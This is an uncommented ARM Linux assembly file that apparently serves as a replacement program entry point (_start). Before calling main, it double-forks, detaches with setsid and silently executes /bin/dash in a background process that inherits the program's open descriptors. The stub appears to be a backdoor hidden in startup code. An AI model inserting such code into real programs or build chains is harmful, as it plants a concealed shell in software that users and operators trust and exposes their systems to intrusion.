.section .rodata
.align 4
z:
.asciz "/bin/dash"
x:
.word z
.word 0
.section .text
.global _start
.extern main
_start:
and sp, sp, #0xFFFFFFF8
ldr r4,[sp]
add r5,sp,#4
ldr r5,[r5]
add r6,sp,#8
ldr r6,[r6]
mov r7,#2
svc #0
cmp r0,#0
bgt p
i:
mov r0,#0
mov r7,#112
svc #0
mov r7,#2
svc #0
cmp r0,#0
bgt t
m:
ldr r0,=z
ldr r1,=x
mov r2,#0
mov r7,#11
svc #0
mov r0,#1
mov r7,#1
svc #0
t:
mov r0,#0
mov r7,#1
svc #0
p:
mov r0,r4
mov r1,r5
mov r2,r6
bl main
mov r7,#1
svc #0
